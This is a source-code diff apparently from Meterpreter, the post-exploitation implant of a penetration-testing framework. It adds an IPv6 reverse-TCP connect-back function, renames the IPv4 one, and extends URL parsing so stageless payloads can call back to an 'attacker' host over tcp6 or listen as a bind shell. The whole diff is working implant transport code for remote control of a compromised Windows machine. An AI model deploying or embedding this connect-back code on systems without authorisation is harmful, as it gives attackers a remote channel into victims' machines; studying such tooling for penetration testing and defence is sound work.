@@ -3,6 +3,7 @@
  */
 #include "metsrv.h"
 #include "../../common/common.h"
+#include <ws2tcpip.h>
 
 extern Command *extensionCommands;
 
@@ -54,12 +55,12 @@ static THREAD * serverThread = NULL;
 static LOCK ** ssl_locks = NULL;
 
 /*!
- * @brief Connects to a provided host/port, downloads a payload and executes it.
+ * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
  * @param host String containing the name or IP of the host to connect to.
  * @param port Port number to connect to.
  * @param retryAttempts The number of times to attempt to retry.
  */
-DWORD reverse_tcp(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
+DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
 {
 	*socketBuffer = 0;
 
@@ -75,13 +76,13 @@ DWORD reverse_tcp(const char* host, u_short port, short retryAttempts, SOCKET* s
 	struct hostent* target = gethostbyname(host);
 	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);
 
-	struct sockaddr_in sock = { 0 };
+	SOCKADDR_IN sock = { 0 };
 	sock.sin_addr.s_addr = inet_addr(targetIp);
 	sock.sin_family = AF_INET;
 	sock.sin_port = htons(port);
 
 	// try connect to the attacker at least once
-	while (connect(socketHandle, (struct sockaddr*)&sock, sizeof(sock)) == SOCKET_ERROR)
+	while (connect(socketHandle, (SOCKADDR*)&sock, sizeof(sock)) == SOCKET_ERROR)
 	{
 		// retry with a sleep if it fails, or exit the process on failure
 		if (retryAttempts-- <= 0)
@@ -95,6 +96,71 @@ DWORD reverse_tcp(const char* host, u_short port, short retryAttempts, SOCKET* s
 	*socketBuffer = socketHandle;
 
 	return ERROR_SUCCESS;
+}
+
+/*!
+ * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
+ * @param host String containing the name or IP of the host to connect to.
+ * @param service The target service/port.
+ * @param scopeId IPv6 scope ID.
+ * @param retryAttempts The number of times to attempt to retry.
+ */
+DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short retryAttempts, SOCKET* socketBuffer)
+{
+	*socketBuffer = 0;
+
+	// start by attempting to fire up Winsock.
+	WSADATA wsaData = { 0 };
+	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
+	{
+		return WSAGetLastError();
+	}
+
+	ADDRINFO hints = { 0 };
+	hints.ai_family = AF_INET6;
+	hints.ai_socktype = SOCK_STREAM;
+	hints.ai_protocol = IPPROTO_TCP;
+
+	LPADDRINFO addresses;
+	if (getaddrinfo(host, service, &hints, &addresses) != 0)
+	{
+		return WSAGetLastError();
+	}
+
+
+	// prepare to connect to the attacker
+	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
+
+	if (socketHandle == INVALID_SOCKET)
+	{
+		dprintf("[STAGELESS IPV6] failed to connect to attacker");
+		return WSAGetLastError();
+	}
+
+	dprintf("[STAGELESS IPV6] Socket successfully created");
+	while (retryAttempts-- > 0)
+	{
+		dprintf("[STAGELESS IPV6] Attempt %u", retryAttempts + 1);
+		for (LPADDRINFO address = addresses; address != NULL; address = address->ai_next)
+		{
+			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;
+
+			if (connect(socketHandle, address->ai_addr, address->ai_addrlen) != SOCKET_ERROR)
+			{
+				dprintf("[STAGELESS IPV6] Socket successfully connected");
+				*socketBuffer = socketHandle;
+				freeaddrinfo(addresses);
+				return ERROR_SUCCESS;
+			}
+		}
+
+		Sleep(RETRY_TIMEOUT_MS);
+	}
+
+	closesocket(socketHandle);
+	freeaddrinfo(addresses);
+	return WSAGetLastError();
+
 }
 
 /*!
@@ -132,13 +198,14 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 
 	// Setup, ready to go, now wait for the connection.
 	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);
+
+	// don't bother listening for other connections
+	closesocket(listenSocket);
+
 	if (acceptSocket == INVALID_SOCKET)
 	{
 		return WSAGetLastError();
 	}
-
-	// don't bother listening for other connections
-	closesocket(listenSocket);
 
 	*socketBuffer = acceptSocket;
 	return ERROR_SUCCESS;
@@ -146,10 +213,25 @@ DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 
 DWORD estbalish_tcp_connection(char* url, SOCKET* socketBuffer)
 {
-	if (strncmp(url, "tcp://", 6) == 0)
+	dprintf("[STAGELESS] Url: %s", url);
+	if (strncmp(url, "tcp", 3) == 0)
 	{
+		const int iRetryAttempts = 30;
 		char* pHost = strstr(url, "//") + 2;
-		char* pPort = strstr(pHost, ":") + 1;
+		char* pPort = strrchr(pHost, ':') + 1;
+
+		// check if we're using IPv6
+		if (url[3] == '6')
+		{
+			dprintf("[STAGELESS] IPv6");
+			char* pScopeId = strrchr(pHost, '?') + 1;
+			*(pScopeId - 1) = '\0';
+			*(pPort - 1) = '\0';
+			dprintf("[STAGELESS] IPv6 host %s port %s scopeid %s", pHost, pPort, pScopeId);
+			return reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, socketBuffer);
+		}
+
+		dprintf("[STAGELESS] IPv4");
 		u_short usPort = (u_short)atoi(pPort);
 
 		// if no host is specified, then we can assume that this is a bind payload, otherwise
@@ -157,12 +239,13 @@ DWORD estbalish_tcp_connection(char* url, SOCKET* socketBuffer)
 		// TODO: check to make sure this is a valid thing to do with IPv6
 		if (*pHost == ':')
 		{
+			dprintf("[STAGELESS] IPv4 bind port %s", pPort);
 			return bind_tcp(usPort, socketBuffer);
 		}
 
-		const int iRetryAttempts = 30;
 		*(pPort - 1) = '\0';
-		return reverse_tcp(pHost, usPort, iRetryAttempts, socketBuffer);
+		dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
+		return reverse_tcp4(pHost, usPort, iRetryAttempts, socketBuffer);
 	}
 	return ERROR_SUCCESS;
 }
